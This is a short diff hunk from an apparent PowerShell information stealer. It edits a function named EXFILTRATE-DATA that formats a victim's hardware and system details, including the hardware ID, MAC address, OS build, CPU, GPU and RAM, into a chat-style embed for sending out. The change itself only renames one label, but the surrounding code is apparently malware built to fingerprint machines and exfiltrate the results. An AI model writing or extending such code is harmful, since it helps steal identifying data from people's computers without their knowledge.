@@ -186,7 +186,7 @@ function EXFILTRATE-DATA {
                     },
                     @{
                         "name" = ":computer: Hardware"
-                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nVersion: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
+                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                     },
                     @{
                         "name" = ":floppy_disk: Disk"
